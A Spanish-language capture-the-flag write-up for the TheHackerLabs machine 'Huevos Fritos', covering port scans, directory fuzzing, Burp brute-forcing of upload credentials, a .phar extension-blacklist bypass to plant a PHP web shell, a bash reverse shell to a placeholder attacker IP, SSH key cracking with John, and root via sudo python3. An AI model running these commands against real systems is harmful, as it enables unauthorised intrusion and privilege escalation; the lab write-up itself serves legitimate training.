---
title: "Huevos Fritos - TheHackerLabs"
date: 2025-07-15
draft: false
slug: "THL-writeup-huevosFritos"
excerpt: "Esta fue una máquina un poco complicada. Después de analizar los escaneos de servicios y de no encontrar nada en la página web activa en el puerto 80, aplicamos Fuzzing para encontrar algún directorio oculto. Encontramos uno y resulta ser una página que permite subida de archivos, solo si tienes las credenciales de acceso correctas. Aplicamos el Cluster Bomb Attack con BurpSuite para descubrir las credenciales válidas y luego, aplicamos un Sniper Attack con BurpSuite para aplicar un bypass a la blacklist de extensiones no permitidas, siendo que logramos subir una WebShell de PHP con la que obtenemos una Reverse Shell y ganamos acceso principal a la máquina víctima. Dentro, enumeramos los archivos de la máquina y descubrimos un archivo como backup que resulta ser una llave privada id_rsa, que logramos crackear con JohnTheRipper y luego usamos esa llave privada para ganar acceso a la máquina víctima vía SSH. Dentro del SSH, revisamos los privilegios de nuestro usuario, descubriendo que puede usar el binario python3 como Root. Utilizamos la guía de GTFOBins para buscar una forma de escalar privilegios, encontrando un comando que nos ayuda a convertirnos en Root."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "SSH", "Web Enumeration", "Fuzzing", "BurpSuite", "Cluster Bomb Attack", "Brute Force Attack", "Sniper Attack", "Bypassing File Upload", "Cracking Hash", "Cracking SSH Private Key", "Abusing Sudoers Privileges", "Privesc - Abusing Sudoers Privileges", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "ffuf"
  - "gobuster"
  - "whatweb"
  - "BurpSuite"
  - "echo"
  - "nano"
  - "nc"
  - "bash"
  - "cat"
  - "head"
  - "grep"
  - "find"
  - "chmod"
  - "ssh2john"
  - "JohnTheRipper"
  - "ssh"
  - "sudo"
  - "python3"
links:
  - "https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/attack-types"
  - "https://gtfobins.github.io/gtfobins/python/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-huevosFritos/huevos_fritos.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.190
PING 192.168.10.190 (192.168.10.190) 56(84) bytes of data.
64 bytes from 192.168.10.190: icmp_seq=1 ttl=64 time=1.43 ms
64 bytes from 192.168.10.190: icmp_seq=2 ttl=64 time=0.843 ms
64 bytes from 192.168.10.190: icmp_seq=3 ttl=64 time=0.974 ms
64 bytes from 192.168.10.190: icmp_seq=4 ttl=64 time=0.845 ms

--- 192.168.10.190 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3045ms
rtt min/avg/max/mdev = 0.843/1.024/1.434/0.242 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.190 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 11:55 CST
Initiating ARP Ping Scan at 11:55
Scanning 192.168.10.190 [1 port]
Completed ARP Ping Scan at 11:55, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:55
Scanning 192.168.10.190 [65535 ports]
Discovered open port 22/tcp on 192.168.10.190
Discovered open port 80/tcp on 192.168.10.190
Completed SYN Stealth Scan at 11:55, 7.85s elapsed (65535 total ports)
Nmap scan report for 192.168.10.190
Host is up, received arp-response (0.0012s latency).
Scanned at 2025-07-15 11:55:10 CST for 8s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.12 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65538 (2.622MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solo hay dos puertos activos, parece que la intrusión será por el **puerto 80**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.10.190 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 11:56 CST
Nmap scan report for 192.168.10.190
Host is up (0.00082s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 5f:73:cb:8a:81:c0:0a:11:18:01:39:e0:1e:bf:ed:60 (ECDSA)
|_  256 5c:7d:ee:db:28:56:7c:ef:46:e1:a6:18:c6:03:01:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))

|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.19 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

La página web activa, está mostrando solamente la página por defecto de **Apache2** y si revisamos su código fuente, no encontraremos nada.

Entonces, vamos a aplicar **Fuzzing** directamente para ver si encontramos un directorio oculto.

## Análisis de Vulnerabilidades {#Analisis}

### Fuzzing {#fuzz}

Primero, probemos con **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.10.190/FUZZ -t 300

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.10.190/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

squirting               [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 3ms]
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 93ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 50ms]
:: Progress: [220545/220545] :: Job [1/1] :: 148 req/sec :: Duration: [0:02:09] :: Errors: 64 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.10.190/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 300
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.190/
[+] Method:                  GET
[+] Threads:                 300
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/squirting            (Status: 301) [Size: 322] [--> http://192.168.10.190/squirting/]
/server-status        (Status: 403) [Size: 280]
Progress: 220545 / 220546 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

En ambos encontramos un directorio, así que vamos a verlo.

### Analizando Directorio Web Encontrado {#Squirting}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-huevosFritos/Captura1.png">
</p>

Parece ser un login y una carga de archivos a la vez. 

Supongo que necesitamos de credenciales válidas para poder subir archivos.

Curiosamente, **Wappalizer** parece que no encuentra las tecnologías usadas, así que veamos qué nos dice **whatweb**:
```bash
whatweb http://192.168.10.190/squirting/
http://192.168.10.190/squirting/ [200 OK] Apache[2.4.59], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], IP[192.168.10.190], PasswordField[password], Title[Login Panel]
```
Nada que nos ayude como tal.

Veamos el código fuente:

<p align="center">
<img src="/assets/images/THL-writeup-huevosFritos/Captura2.png">
</p>

Tenemos un archivo llamado **astronomy.php** que, supongo, se encarga de revisar los archivos que se vayan a subir.

Si lo visitamos, veremos un mensaje simple al inicio, pero si bajamos, encontraremos un comentario con una ruta:

<p align="center">
<img src="/assets/images/THL-writeup-huevosFritos/Captura3.png">
</p>

Al visitar la ruta, habremos descubierto dónde se guardan los archivos subidos:

<p align="center">
<img src="/assets/images/THL-writeup-huevosFritos/Captura4.png">
</p>

Tratemos de subir un archivo random con un usuario random.

Creamos el archivo random:
```bash
echo "test" > test.txt
```

Lo subimos usando un usuario y contraseña random como **test** y observa la respuesta que obtuvimos:

<p align="center">
<img src="/assets/images/THL-writeup-huevosFritos/Captura5.png">
</p>

Esto me hace pensar que sí es necesario un usuario y contraseña válidos para subir nuestro archivo.

Apliquemos fuerza bruta con **BurpSuite**.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Cluster Bomb Attack como Fuerza Bruta para Encontrar Credenciales Válidas {#clusterBomb}

¿Qué es un **Cluster Bomb Attack**?

| **Cluster Bomb Attack** |
|:-----------:|
| *El Cluster Bomb attack en Burp Suite Intruder es una de las técnicas de ataque que puedes usar para realizar pruebas automatizadas con múltiples listas de carga (payloads). Es muy útil cuando necesitas combinar diferentes valores y ver cómo responde la aplicación a cada combinación.* |

Capturemos la subida de archivos para mandarla al **Intruder** y poder configurar el **ataque Cluster Bomb**:

<p align="center">
<img src="/assets/images/THL-writeup-huevosFritos/Captura6.png">
</p>

Desglosemos lo que hicimos:
* Elegimos el **ataque Cluster Bomb**.
* Escogemos el usuario y la contraseña para agregarlos con el botón **Add**, siendo estos dos campos los que serán utilizados por el ataque.
* Cargamos el payload a usar para cada campo. Debes elegir el campo y luego cargarle el payload, en mi caso, escogi los siguientes payloads: `/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt` y `/usr/share/wordlists/metasploit/unix_passwords.txt`.
* Quitamos la opción que URL encodea las peticiones para evitar problemas o errores.
* Ya con todo configurado y listo, ejecutamos el ataque con **Start Attack**.

Logramos encontrar las credenciales válidas:

<p align="center">
<img src="/assets/images/THL-writeup-huevosFritos/Captura7.png">
</p>

Entonces, nuestro archivo random debió haberse subido:

<p align="center">
<img src="/assets/images/THL-writeup-huevosFritos/Captura8.png">
</p>

Ahí está.

Como ya tenemos acceso a la carga de archivos, podríamos tratar de subir una **Reverse Shell** o una **WebShell**, pero observa la respuesta que obtenemos si lo hacemos:

<p align="center">
<img src="/assets/images/THL-writeup-huevosFritos/Captura9.png">
</p>

Apliquemos un **Sniper Attack** para ver qué extensiones son aceptadas y cuáles no.

### Aplicando Sniper Attack para Descubrir Extensiones Aceptadas por Carga de Archivos y Ganando Acceso a la Máquina Víctima {#Sniper}

Captura la misma petición, pero subiendo tu **Reverse Shell** o una **WebShell** (que yo siempre uso una **WebShell**), luego envíala al **Intruder** y ahí la configuraremos:

<p align="center">
<img src="/assets/images/THL-writeup-huevosFritos/Captura10.png">
</p>

Desglosemos lo que hicimos:
* Escogemos el **Sniper attack**.
* Seleccionamos la extensión de nuestro archivo y lo agregamos con el botón **Add**.
* Cargamos el payload que será un wordlist de extensiones, en mi caso usé el wordlist: `/usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions.txt`
* Quitamos la opción que URL encodea las peticiones para evitar problemas o errores.
* Ya con todo configurado y listo, ejecutamos el ataque con **Start Attack**.

Revisando el ataque, hay varias extensiones que fueron aceptadas, pero la que nos llama la atención es la extensión `.phar`:

<p align="center">
<img src="/assets/images/THL-writeup-huevosFritos/Captura11.png">
</p>

Y si se subieron varias extensiones, por consiguiente, las deberíamos ver en el directorio donde se están guardando:

<p align="center">
<img src="/assets/images/THL-writeup-huevosFritos/Captura12.png">
</p>

Ahí está.

Seleccionamos la **WebShell** y ejecutamos un comando:

<p align="center">
<img src="/assets/images/THL-writeup-huevosFritos/Captura13.png">
</p>

Funciona, ahora podemos mandarnos una **Reverse Shell**.

Primero, abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Utiliza y ejecuta la siguiente **Reverse Shell**:
```bash
bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'
```

<p align="center">
<img src="/assets/images/THL-writeup-huevosFritos/Captura14.png">
</p>

Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.190] 33242
bash: cannot set terminal process group (528): Inappropriate ioctl for device
bash: no job control in this shell
www-data@huevosfritos:/var/www/html/squirting/pantumaca$ whoami
whoami
www-data
```
Estamos dentro.

Ya solo falta obtener una sesión interactiva:
```bash
# Paso 1
script /dev/null -c bash

# Paso 2
CTRL + Z

# Paso 3
stty raw -echo; fg

# Paso 4
reset -> xterm

# Paso 5
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```
Continuemos.

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima y Crackeo de Llave Privada de Servicio SSH {#linEnum}

Regresando a un directorio anterior, podemos encontrar el script **astronomy.php** que es el que se encarga de la subida de archivos:
```bash
www-data@huevosfritos:/var/www/html/squirting$ cat astronomy.php | head -n 46
<?php
// Credenciales ficticias para demostración
$usuario_valido = "admin";
$contrasena_valida = "admin";

// Directorio donde se subirá el archivo
$directorioObjetivo = "pantumaca/";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Recuperar nombre de usuario y contraseña
    $usuario = $_POST['username'];
    $contrasena = $_POST['password'];

    // Validar las credenciales de login
    if ($usuario === $usuario_valido && $contrasena === $contrasena_valida) {
        // Verificar si se ha subido un archivo
        if (isset($_FILES['archivoSubido']) && $_FILES['archivoSubido']['error'] == 0) {
            $archivoObjetivo = $directorioObjetivo . basename($_FILES["archivoSubido"]["name"]);
            $subidaOk = 1;
            $tipoArchivo = strtolower(pathinfo($archivoObjetivo, PATHINFO_EXTENSION));

            // Verificar la extensión del archivo
            $extensionesNoPermitidas = array("php", "php3", "php4", "php5", "php", "phtml", "exe", "dll", "js", "html", "htm", "cgi", "pl", "py", "rb", "sh", "bat", "cmd", "com", "vbs", "vbe", "jse", "wsf", "wsh", "scr", "mhtml", "mht", "jar", "class", "war", "ear", "asp", "aspx", "cer", "csr", "jsp", "jspx", "jhtml");

            if (in_array($tipoArchivo, $extensionesNoPermitidas) && $tipoArchivo != "phar") {
                echo "Ha ocurrido un error: Tipo de archivo no permitido.";
                $subidaOk = 0;
            }

            // Intentar mover el archivo subido al directorio deseado
            if ($subidaOk == 1 && move_uploaded_file($_FILES["archivoSubido"]["tmp_name"], $archivoObjetivo)) {
                echo "Lo que hayas ponio " . htmlspecialchars(basename($_FILES["archivoSubido"]["name"])) . " za zubio.";
            } else {
                echo "Prohibio, directo al /404/pionono";
            }
        } else {
            echo "Canela, pero no has subio na kompare";
        }
    } else {
        echo "Algo a fallao zeguro, pero zeguro zeguro";
    }
} else {
    echo "Na de na";
}
?>
```
Al leerlo, podemos ver que verifica si las credenciales son válidas y, si lo son, analiza la extensión del archivo subido, comparándolo con una blacklist de extensiones no permitidas.

Veamos qué usuarios existen en la máquina:
```bash
www-data@huevosfritos:/var/www/html/squirting$ cat /etc/passwd | grep "bash"
root:x:0:0:root:/root:/bin/bash
huevosfritos:x:1001:1001::/home/huevosfritos:/bin/bash
```
Tenemos al **usuario huevosfritos**.

Podemos ver su directorio en el directorio `/home`:
```bash
www-data@huevosfritos:/var/www/html/squirting$ ls -la /home
total 12
drwxr-xr-x  3 root         root         4096 Jun 16  2024 .
drwxr-xr-x 18 root         root         4096 Jun  8  2024 ..
drwxr-xr-x  4 huevosfritos huevosfritos 4096 Jun 16  2024 huevosfritos
```

Tenemos permitido entrar, pero no podremos ver la flag que está ahí:
```bash
www-data@huevosfritos:/var/www/html/squirting$ ls -la /home/huevosfritos/
total 32
drwxr-xr-x 4 huevosfritos huevosfritos 4096 Jun 16  2024 .
drwxr-xr-x 3 root         root         4096 Jun 16  2024 ..
lrwxrwxrwx 1 root         root            9 Jun 16  2024 .bash_history -> /dev/null
-rw-r--r-- 1 huevosfritos huevosfritos  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 huevosfritos huevosfritos 3526 Apr 23  2023 .bashrc
drwxr-xr-x 3 huevosfritos huevosfritos 4096 Jun 16  2024 .local
-rw-r--r-- 1 huevosfritos huevosfritos  807 Apr 23  2023 .profile
drwx------ 2 huevosfritos huevosfritos 4096 Jun 16  2024 .ssh
-r-------- 1 huevosfritos huevosfritos   36 Jun 16  2024 user.txt
```
Investigando un poco más, no encontraremos nada que nos pueda ayudar a escalar privilegios.

Sin embargo, analizando los archivos que podemos leer con el siguiente comando (**OJO**, son bastantes), veremos un archivo interesante:
```bash
www-data@huevosfritos:/home/huevosfritos$ find / -type f -readable 2>/dev/null
...
/var/backups/apt.extended_states.1.gz
/var/backups/apt.extended_states.0
/var/backups/.cositas
/var/backups/apt.extended_states.2.gz
...
```

Vamos a leer ese archivo:
```bash
www-data@huevosfritos:/home/huevosfritos$ cat /var/backups/.cositas
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1...
...
...
```
Es una **llave privada id_rsa**, así que vamos a crackearla.

Cópiala en tu máquina y dale los permisos correctos:
```bash
nano id_rsa
--------
chmod 600 id_rsa
```

Obtengamos el hash de esa llave privada con **ssh2john**:
```bash
ssh2john id_rsa > hash
```

Y vamos a crackear ese hash con **JohnTheRipper**:
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
honda1           (id_rsa)     
1g 0:00:01:47 DONE (2025-07-15 13:25) 0.009269g/s 32.92p/s 32.92c/s 32.92C/s Password1..01234
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Tardo un poco, pero ya tenemos la frase usada en la llave privada.

Probemos esta llave con el **usuario huevosfritos**:
```bash
ssh -i id_rsa huevosfritos@192.168.10.190
Enter passphrase for key 'id_rsa': 
Linux huevosfritos 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64
...
Last login: Sun Jun 16 12:24:42 2024
huevosfritos@huevosfritos:~$ whoami
huevosfritos
```
Excelente, ahora nos autenticamos vía **SSH**.

Ahora sí podemos leer la flag del usuario:
```bash
huevosfritos@huevosfritos:~$ ls
user.txt
huevosfritos@huevosfritos:~$ cat user.txt
...
```

### Escalando Privilegios con Binario Python3 {#python3}

Ya que estamos con este usuario, vemos si podemos ver qué privilegios tiene:
```bash
huevosfritos@huevosfritos:~$ sudo -l
Matching Defaults entries for huevosfritos on huevosfritos:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User huevosfritos may run the following commands on huevosfritos:
    (root) NOPASSWD: /usr/bin/python3
```
Muy bien, podemos usar el **binario python3** como **Root**.

Busquemos en la **guía de GTFOBins** si hay una forma de escalar privilegios con este binario:
* <a href="https://gtfobins.github.io/gtfobins/python/" target="_blank">GTFOBins: python</a>

Si bien no es el mismo binario, probemos si funciona alguno de los ejemplos que menciona.

Utilizaremos el siguiente comando:

<p align="center">
<img src="/assets/images/THL-writeup-huevosFritos/Captura15.png">
</p>

Probémoslo:
```bash
huevosfritos@huevosfritos:~$ sudo python3 -c 'import os; os.system("/bin/bash")'
root@huevosfritos:/home/huevosfritos# whoami
root
```
Ya somos **Root**.

Obtengamos la última flag:
```bash
root@huevosfritos:/home/huevosfritos# cd /root
root@huevosfritos:~# ls
hola.txt  root.txt
root@huevosfritos:~# cat hola.txt 
ajsfjs
root@huevosfritos:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
